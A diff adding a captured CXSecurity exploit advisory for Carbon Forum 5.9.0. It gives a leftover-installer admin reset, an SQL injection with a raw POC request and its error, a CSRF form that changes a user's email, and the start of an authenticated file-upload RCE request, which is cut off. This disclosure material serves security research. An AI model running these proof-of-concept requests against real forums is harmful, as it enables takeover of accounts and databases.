@@ -1,0 +1,167 @@
+---
+title: Carbon Forum 5.9.0 Cross Site Request Forgery / SQL Injection
+url: https://cxsecurity.com/issue/WLB-2024060055
+source: CXSECURITY Database RSS Feed - CXSecurity.com
+date: 2024-06-25
+fetch_date: 2025-10-06T16:54:41.892971
+---
+
+# Carbon Forum 5.9.0 Cross Site Request Forgery / SQL Injection
+
+[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)
+
+* [Home](https://cxsecurity.com/)
+* Bugtraq
+  + [Full List](https://cxsecurity.com/wlb/)
+  + [Only Bugs](https://cxsecurity.com/bugs/)
+  + [Only Tricks](https://cxsecurity.com/tricks/)
+  + [Only Exploits](https://cxsecurity.com/exploit/)
+  + [Only Dorks](https://cxsecurity.com/dorks/)
+  + [Only CVE](https://cxsecurity.com/cvelist/)
+  + [Only CWE](https://cxsecurity.com/cwelist/)
+  + [Fake Notes](https://cxsecurity.com/bogus/)
+  + [Ranking](https://cxsecurity.com/best/1/)
+* CVEMAP
+  + [Full List](https://cxsecurity.com/cvemap/)
+  + [Show Vendors](https://cxsecurity.com/cvevendors/)
+  + [Show Products](https://cxsecurity.com/cveproducts/)
+  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
+  + [Check CVE Id](https://cxsecurity.com/cve/)
+  + [Check CWE Id](https://cxsecurity.com/cwe/)
+* Search
+  + [Bugtraq](https://cxsecurity.com/search/)
+  + [CVEMAP](https://cxsecurity.com/search/cve/)
+  + [By author](https://cxsecurity.com/search/author/)
+  + [CVE Id](https://cxsecurity.com/cve/)
+  + [CWE Id](https://cxsecurity.com/cwe/)
+  + [By vendors](https://cxsecurity.com/cvevendors/)
+  + [By products](https://cxsecurity.com/cveproducts/)
+* RSS
+  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
+  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
+  + [CVE Products](https://cxsecurity.com/cveproducts/)
+  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
+  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
+  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
+* More
+  + [cIFrex](http://cifrex.org/)
+  + [Facebook](https://www.facebook.com/cxsec)
+  + [Twitter](https://twitter.com/cxsecurity)
+  + [Donate](https://cxsecurity.com/donate/)
+  + [About](https://cxsecurity.com/wlb/about/)
+
+* [Submit](https://cxsecurity.com/wlb/add/)
+
+|  |  |  |  |
+| --- | --- | --- | --- |
+|  |  | |  | | --- | | **Carbon Forum 5.9.0 Cross Site Request Forgery / SQL Injection** **2024.06.24**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")  [CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |
+
+{-} Title => Carbon Forum 5.9.0 - Multiple Exploits
+{-} Author => bRpsd [cy@Live.no]
+{-} Date Release => 22 June, 2024
+{-} Vendor => Carbon Forum <= 5.9.0
+Homepage => https://www.94cb.com/
+Download => https://github.com/lincanbin/Carbon-Forum
+Vulnerable Versions => 5.9.0 >=
+Tested Version => 5.9.0 on xampp Server.
+#######################################################################################
+Vulnerability #1 : Reset Administrator Password & Database settings
+File Path: http://localhost/Carbon-Forum/install/
+INFO: The install folder remains after installation which allows attackers to recreate a new DB and have an admin account by default through registering the first user
+#######################################################################################
+#######################################################################################
+Vulnerability #2 : SQL Injection
+Vulnerable Code: /Carbon-Forum/install/index.php
+if ($\_SERVER['REQUEST\_METHOD'] == 'POST') {
+$fp = fopen(\_\_DIR\_\_ . '/database.sql', "r") or die("SQL文件无法打开。 The SQL File could not be opened.");
+//dobefore
+if (isset($\_POST["Language"]) && isset($\_POST["DBHost"]) && isset($\_POST["DBName"]) && isset($\_POST["DBUser"]) && isset($\_POST["DBPassword"])) {
+$Language = $\_POST['Language'];
+$DBHost = $\_POST['DBHost'];
+$DBName = $\_POST['DBName'];
+$DBUser = $\_POST['DBUser'];
+$DBPassword = $\_POST['DBPassword'];
+$SearchServer = $\_POST['SearchServer'];
+$SearchPort = $\_POST['SearchPort'];
+$EnableMemcache = $\_POST['EnableMemcache'];
+$MemCachePrefix = $\_POST['MemCachePrefix'];
+} else {
+die("An Unexpected Error Occured!");
+}
+//$WebsitePath = $\_POST['WebsitePath'];
+$WebsitePath = $\_SERVER['PHP\_SELF'] ? $\_SERVER['PHP\_SELF'] : $\_SERVER['SCRIPT\_NAME'];
+if (preg\_match('/(.\*)\/install/i', $WebsitePath, $WebsitePathMatch)) {
+$WebsitePath = $WebsitePathMatch[1];
+} else {
+$WebsitePath = '';
+}
+//初始化数据库操作类
+require('../library/PDO.class.php');
+$DB = new Db($DBHost, 3306, '', $DBUser, $DBPassword);
+$DatabaseExist = $DB->single("SELECT SCHEMA\_NAME FROM INFORMATION\_SCHEMA.SCHEMATA WHERE SCHEMA\_NAME = :DBName", array('DBName' => $DBName));
+if (empty($DatabaseExist)) {
+$DB->query("CREATE DATABASE IF NOT EXISTS " . $DBName . ";");
+}
+POC Request:
+POST http://localhost/Carbon-Forum/install/?
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 173
+Origin: http://localhost
+Connection: keep-alive
+Referer: http://localhost/Carbon-Forum/install/
+Cookie: CarbonBBS\_View=desktop; CarbonBBS\_UserID=5; CarbonBBS\_UserExpirationTime=1721643860; CarbonBBS\_UserCode=3ff84d77640629e72e311cd7a52e5df7; PHPSESSID=addf2aa242dcb91d00faf41e6d6b07b3
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Language=en&DBHost=localhost&DBName=&DBUser=test'&DBPassword=&SearchServer=&SearchPort=&EnableMemcache=false&MemCachePrefix=carbon\_&submit=安 装 / Install
+Response:
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
+You can find the error back in the log.
+#######################################################################################
+################################################################################################################
+Vulnerability #3 : CSRF - Change users email
+File Path: http://localhost/Carbon-Forum/settings
+Method: POST
+Parameter : UserMail
+Code:Carbon-Forum/controller/settings.php
+POC:
+case 'UpdateUserInfo':
+$CurUserInfo['UserSex'] = intval(Request('POST', 'UserSex', 0));
+$CurUserInfo['UserMail'] = IsEmail(Request('POST', 'UserMail', $CurUserInfo['UserMail'])) ? Request('POST', 'UserMail', $CurUserInfo['UserMail']) : $CurUserInfo['UserMail'];
+$CurUserInfo['UserHomepage'] = CharCV(Request('POST', 'UserHomepage', $CurUserInfo['UserHomepage']));
+$CurUserInfo['UserIntro'] = CharCV(Request('POST', 'UserIntro', $CurUserInfo['UserIntro']));
+$UpdateUserInfoResult = UpdateUserInfo(array(
+'UserSex' => $CurUserInfo['UserSex'],
+'UserMail' => $CurUserInfo['UserMail'],
+'UserHomepage' => $CurUserInfo['UserHomepage'],
+'UserIntro' => $CurUserInfo['UserIntro']
+));
+if ($UpdateUserInfoResult) {
+$UpdateUserInfoMessage = $Lang['Profile\_Modified\_Successfully'];
+<form method='POST' action='http://localhost/Carbon-Forum/settings'>
+<input type="hidden" name="Action" value="UpdateUserInfo">
+<input type="hidden" name="UserSex" value="0">
+<input type="hidden" name="UserMail" value="changed@new-email.com">
+<input type="hidden" name="UserHomepage" value="">
+<input type="hidden" name="UserIntro" value="">
+<input type='submit' value='submit'>
+</form>
+################################################################################################################
+#######################################################################################
+Vulnerability #4 : Arbitrary File Upload - RCE [Authenticated]
+Info: Administrator can change allowed files in dashboard -> parameter
+POC POST:
+http://localhost/Carbon-Forum/dashboard#dashboard4
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/x-www-form-urlencod...
